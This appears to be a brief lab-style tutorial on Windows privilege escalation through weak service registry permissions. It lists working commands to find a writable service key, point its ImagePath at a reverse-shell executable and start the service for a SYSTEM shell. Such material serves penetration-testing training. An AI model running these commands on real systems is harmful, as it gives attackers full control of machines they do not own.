# Weak Registry Permissions

### **Enumeration**

Find a service running with SYSTEM privileges (SERVICE\_START\_NAME).

```POWERSHELL
sc qc <servizio>
```

### **Exploitation**

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

{% code overflow="wrap" %}
```powershell
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
{% endcode %}

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

{% code overflow="wrap" %}
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
{% endcode %}

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```powershell
net start regsvc
```
